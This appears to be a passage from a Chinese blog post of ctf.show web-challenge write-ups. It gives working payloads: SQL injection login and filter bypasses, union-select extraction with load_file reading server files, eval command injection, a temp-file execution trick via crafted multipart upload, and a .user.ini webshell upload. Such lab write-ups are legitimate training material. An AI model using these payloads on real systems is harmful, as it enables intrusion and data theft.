class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>出现了过滤</p>
<p>从源码中可以得知几乎把注入用到的关键词过滤的差不多了。<br>如果只有这一条现在可以采用双写绕过，但是下面这条限制，使得无法双写绕过</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="variable">$username</span>)!=<span class="built_in">strlen</span>(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			die(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）<br>不加group by时的输出如下：<br><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220314207.png" alt="image-20220402220314207"><br>在使用group by以后会按照password中的值进行排列：<br><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220346449.png" alt="image-20220402220346449"><br>②with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>来看实例：<br><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402220411202.png" alt="image-20220402220411202">结果中将会多出一行，其中password列为null，count（*)为统计和。<br>这里我们就可以通过骚姿势绕过了。<br>其中/**/是为了绕过空格过滤</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=admin&#x27;<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span><span class="keyword">group</span><span class="comment">/**/</span>by<span class="comment">/**/</span>password<span class="comment">/**/</span><span class="keyword">with</span><span class="comment">/**/</span>rollup#&amp;password=</span><br></pre></td></tr></table></figure>

<p>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[‘password’]的限制成功登陆。<br>登录成功即可显示flag。</p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402221343218.png" alt="image-20220402221343218"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>password是由我们自己输入的，session中的password存储在本地，所以我们只需要输入空密码，并且将本地的session删除即可成功绕过。</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看网页源代码后发现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hit:?cmd= --&gt;</span></span><br></pre></td></tr></table></figure>

<p>输入?cmd=phpinfo(); 有回显</p>
<p>猜测源码中应该为<code>eval($_GET[&#39;cmd&#39;]);</code></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220402225225932.png" alt="image-20220402225225932"></p>
<p>?cmd=highlight_file(“index.php”); 或 ?cmd=show_source(“index.php”);</p>
<p>显示了源码：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ctf.show_web12<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>ctf.show_web12<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>where is the flag?<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- hit:?cmd= --&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">            <span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=print_r(glob(<span class="string">&#x27;*&#x27;</span>)); 或：</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="bash">=print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span></span><br><span class="line">打印目录下文件，有两个文件，输出内容即可</span><br><span class="line"></span><br><span class="line">?<span class="keyword">cmd</span><span class="bash">=highlight_file(<span class="string">&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>

<h2 id="web红包第二弹"><a href="#web红包第二弹" class="headerlink" title="web红包第二弹"></a>web红包第二弹</h2><p>查看网页源代码后发现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hit:?cmd= --&gt;</span></span><br></pre></td></tr></table></figure>

<p>随便传入参数后，出现源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此段代码要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等。可以使用的有：p ` ? / + &lt; &gt; =</p>
<p>构造文件上传，<img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144141565.png" alt="image-20220403144141565"></p>
<p>上传1.txt，内容为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  通过可用的字符构造cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`，由<span class="keyword">eval</span>（<span class="variable">$cmd</span>）来运行临时文件</span><br><span class="line"> <span class="meta">?&gt;</span>闭合前面 </span><br><span class="line">解释构造原理：<span class="meta">&lt;?=</span> <span class="variable">$cmd</span> <span class="meta">?&gt;</span> 等于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="variable">$cmd</span>) <span class="meta">?&gt;</span></span><br><span class="line">在php中，<span class="meta">&lt;?</span> <span class="meta">?&gt;</span>称为短标签，<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签。php5.<span class="number">4.0</span>以后， <span class="meta">&lt;?=</span> 总是可代替 <span class="meta">&lt;?</span> <span class="keyword">echo</span>。</span><br><span class="line"> 在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。</span><br><span class="line"></span><br><span class="line">点 .</span><br><span class="line">点命令等于source命令，用来执行文件。</span><br><span class="line">source /home/user/bash   等同于   . /home/user/bash</span><br><span class="line">+：空格</span><br><span class="line">/??p/p?p??????</span><br><span class="line">临时文件夹目录，默认是/tmp目录， 默认为 php+<span class="number">4</span>或者<span class="number">6</span>位随机数字和大小写字母，在windows下有tmp后缀，linux没有。</span><br><span class="line">windows下：phpXXXXXX.tmp  linux下：phpXXXXXX</span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<p>​    用burpsuite发送POST请求，上传文件。<img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144513418.png" alt="image-20220403144513418"></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144433732.png" alt="image-20220403144433732"></p>
<p>以上请求头修改了3个地方：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Content-<span class="keyword">Type</span>: multipart/<span class="keyword">form</span>-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line"> </span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: <span class="keyword">form</span>-data; name=<span class="string">&quot;fileUpload&quot;</span>; filename=<span class="string">&quot;1.txt&quot;</span></span><br><span class="line">Content-<span class="keyword">Type</span>: text/plain</span><br><span class="line"> </span><br><span class="line">#! /bin/<span class="keyword">sh</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">cat</span> /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br><span class="line"></span><br><span class="line">Content-<span class="keyword">Type</span>有两个值：</span><br><span class="line">①application/x-www-<span class="keyword">form</span>-urlencoded(默认值) ：上传键值对</span><br><span class="line">②multipart/<span class="keyword">form</span>-data：上传文件</span><br><span class="line"></span><br><span class="line">boundary为边界分隔符</span><br><span class="line">文件开始标记：-----------------------------10242300956292313528205888</span><br><span class="line">文件结束标记：-----------------------------10242300956292313528205888--</span><br><span class="line">其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</span><br><span class="line"></span><br><span class="line">   #! /bin/<span class="keyword">sh</span> 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的<span class="keyword">shell</span>路径。bash只是<span class="keyword">shell</span>的一种，还有很多其它<span class="keyword">shell</span>，如：<span class="keyword">sh</span>,csh,ksh,tcsh。首先用命令<span class="keyword">ls</span> /  来查看服务器根目录有哪些文件，发现有flag.txt，然后再用<span class="keyword">cat</span> /flag.txt 即可。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>常见的源码泄露<br> .hg源码泄漏 .git源码泄漏 .DS_Store文件泄漏，还有以.php.bak结尾的网页,.phps等</p>
<p>输入upload.php.bak 下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (strlen(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(strlen(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们发现了上传文件的要求，文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php。我们肯定是要上传一句话木马的，既然小于等于24可以这样写&lt;?php eval($_GET[‘a’]);正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句。这里用一种特殊的手法来绕过。<br>1.我们先将一句话保存为a.txt。<br>2.上传a.txt<br>3上传.user.ini文件。<br>对于php中的.user.ini有如下解释：<br>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.user.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容<br>4.蚁剑连接<br> 连接不上，所以我们直接在网页上查找flag。<br> <code>a=print_r(glob(&quot;*&quot;));</code></p>
<p>接着输入 <code>a=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php &quot;);</code></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403152209581.png" alt="image-20220403152209581"></p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161536068.png" alt="image-20220403161536068"></p>
<p> case 44444:<br>      echo ‘@A@’;没有break</p>
<p> case 3:<br>      echo ‘@A@’;<br>    case 6000000:<br>      echo “$url”;也没有break</p>
<p>如果不加break会一直执行下去，直到结束或者遇到break</p>
<p>在这个题目中有一条限制 <code>sleep($c);</code>就是我们输入的c是多少就会等待多少秒然后执行。所以我们想要输出$url就得找到一个小的case。我们可以看到下图中的c=3显然满足。case 3 后面没有break会接着执行下面的<code>echo &quot;$url&quot;</code></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161806446.png" alt="image-20220403161806446"></p>
<p>成功显示 here_1s_your_f1ag.php，接下来访问该页面。是一个很明显的注入页面，但还不确定能否注入。</p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161937347.png" alt="image-20220403161937347"></p>
<p>if(preg_match(’/information_schema.tables|information_schema.columns|linestring| |polygon/is’, $_GET[‘query’])){undefined<br>die(’@A@’);<br>}<br>过滤的关键词有information_schema.tables，information_schema.columns，linestring，空格，polygon。</p>
<p>在这里提供一种绕过的方法——反引号<br>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号。<br>例如</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.<span class="keyword">tables</span>和information_schema.`<span class="keyword">tables</span>`</span><br></pre></td></tr></table></figure>

<p>都可以使用。<br>网页的弹窗使得我们不容易观察，我们直接在源代码页面进行注入。<br>例如这样</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="regexp">//</span><span class="number">124.156</span>.<span class="number">121.112</span>:<span class="number">28051</span><span class="regexp">/here_1s_your_f1ag.php?query=1/</span>**<span class="regexp">/order/</span>**<span class="regexp">/by/</span>**/<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>当输入order by 1时才不显示错误，所以有一个回显位置。<br>接下来使用联合注入。</p>
<p>爆库名(web)</p>
<pre><code>?query=-1/**/union/**/select/**/database()
</code></pre>
<p>爆表名(content)</p>
<pre><code>?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()
</code></pre>
<p>爆字段名(id,username,password)</p>
<pre><code>?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#39;content&#39;
</code></pre>
<p>爆值</p>
<pre><code>?query=-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content
</code></pre>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403162544863.png" alt="image-20220403162544863"><br>到这我们发现数据库中并没有我们想要的flag，但是有一条提示tell you a secret,secert has a secret… 所以很有可能flag在secret.php中，现在就有一个问题，我们怎么从数据库中查看文件内容呢，mysql提供了读取本地文件的函数load_file()<br>所以我们构造语句：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>load<span class="constructor">_file(&#x27;<span class="operator">/</span><span class="params">var</span><span class="operator">/</span><span class="params">www</span><span class="operator">/</span><span class="params">html</span><span class="operator">/</span><span class="params">secret</span>.<span class="params">php</span>&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403162829419.png" alt="image-20220403162829419"></p>
<p>也就是如果/tmp/gtf1y中的内容为ctf.show则输出/real_flag_is_here中的值，所以我们直接将/real_flag_is_here读取即可得到flag。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="regexp">/**/u</span>nion<span class="regexp">/**/</span>select<span class="regexp">/**/</span>load_file(<span class="string">&#x27;/real_flag_is_here&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ctfshow-web1"><a href="#ctfshow-web1" class="headerlink" title="ctfshow web1"></a>ctfshow web1</h2><p>提示：flag在指定用户的密码中。</p>
<p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		error_reporting(<span class="number">0</span>);</span><br><span class="line">		session_start();</span><br><span class="line">		<span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select pwd from user where uname = &#x27;<span class="subst">$username</span>&#x27; limit 1&quot;</span>;</span><br><span class="line">			<span class="variable">$res</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>]===<span class="variable">$password</span>)&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">				header(<span class="string">&quot;location:/user_main.php?order=id&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				header(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			header(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开login.php能禁的基本都禁干净了，登录页面貌似没有注入的可能。reg.php也是如此，所以注册页面也没可能了。剩下最后一个就是显示信息的页面了。这里可以看到在数据库中是把所有的字段（包括密码）都给查出来了，但是没有显示密码的地方。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span 